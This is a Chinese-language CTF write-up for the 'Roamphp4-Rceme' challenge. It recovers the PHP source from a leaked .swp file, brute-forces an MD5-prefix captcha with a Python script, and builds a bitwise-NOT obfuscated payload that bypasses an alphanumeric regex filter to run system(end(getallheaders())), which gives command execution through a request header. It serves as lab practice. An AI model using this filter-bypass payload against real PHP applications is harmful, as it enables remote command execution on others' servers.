---
title: '[极客大挑战 2020]Roamphp4-Rceme'
date: 2024-11-19 20:05:58
tags: rce
categories: 刷题笔记
---

### [极客大挑战 2020]Roamphp4-Rceme

打开源码，可以发现提示

![image-20241119211046846](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411192110982.png)

有个swp文件，我们访问/.index.php.swp

我们把它下载下来就得到了一个swp文件

然后去Linux的vim -r进行源码读取

<!--more-->

```php
<?php
error_reporting(0);
session_start();
if(!isset($_SESSION['code'])){
        $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5);
        //获得验证数字
}
 
if(isset($_POST['cmd']) and isset($_POST['code'])){
 
        if(substr(md5($_POST['code']),0,5) !== $_SESSION['code']){
                //post传的code经过md5加密前五个字符，要等于session的code
                die('<script>alert(\'Captcha error~\');history.back()</script>');
        }
        $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5);
        $code = $_POST['cmd'];
        if(strlen($code) > 70 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/ixm',$code)){
                //修正符:x 将模式中的空白忽略; 
                die('<script>alert(\'Longlone not like you~\');history.back()</script>');
        }else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
                @eval($code);
                die();
        }
 
```

在rce前，他有个认证。md5的前五位数要等于给定的值，我们写个python脚本

```python
import hashlib
for i in range(1,10000000000000):
    m=hashlib.md5(str(i).encode()).hexdigest()
    if m[0:5]=='5dc64':
        print(i)
        break
```

我们重点看正则

```
if(strlen($code) > 70 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/ixm',$code))
```

这个要求无参数rce

```
if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code))
```

这个要求形式为

![img](http://47.96.173.116/wp-content/uploads/2021/10/MOGTTH8GBNYPT0CQ1.png)

然后末尾还要加个;，才能保证最后只剩下；

我们了解一些前置知识

> ('phpinfo')()
> 		'phpinfo'()
> 		['phpinfo']{0}()
> 	效果作用是一样的。
>
> phpinfo(): `[~%8F%97%8F%96%91%99%90][~%CF]();`
> 加这个`[~%FF]`只是因为php7的解析方式，当然换成其他的也可以例如[~%EF] [~%CF]

我们使用

```
system(end(getallheader())); //getallheaders()简单讲可以获取数包据头
```

我们反编译一下就得到了

```
[~%8C%86%8C%8B%9A%92][~%CF]([~%9A%91%9B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]()));
```

![image-20241119213400736](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411192134848.png)
